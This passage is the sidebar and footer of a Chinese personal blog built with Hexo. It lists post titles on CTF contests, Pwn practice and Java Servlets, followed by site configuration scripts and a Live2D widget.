    <span><a href="/posts/b3ad4123.html" title="有小考点的Web题">有小考点的Web题</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Java/" title="分类于 Java从入门到入狱">Java从入门到入狱</a>
</div>

    <span><a href="/posts/3fe30769.html" title="一、Servlet和JSP技术概述">一、Servlet和JSP技术概述</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
</div>

    <span><a href="/posts/9b0d93f7.html" title="Pwn刷题记录（不停更新）">Pwn刷题记录（不停更新）</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
</div>

    <span><a href="/posts/fe4eec6d.html" title="【2024】高校网络安全管理运维赛">【2024】高校网络安全管理运维赛</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
</div>

    <span><a href="/posts/a929fb97.html" title="【2023】LitCTF">【2023】LitCTF</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
</div>

    <span><a href="/posts/4bf5e0ee.html" title="【2024】LitCTF">【2024】LitCTF</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
  </div>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: 'posts/de34fe7b.html',
    favicon: {
      show: "（●´3｀●）やれやれだぜ",
      hide: "(´Д｀)大変だ！"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
</html>
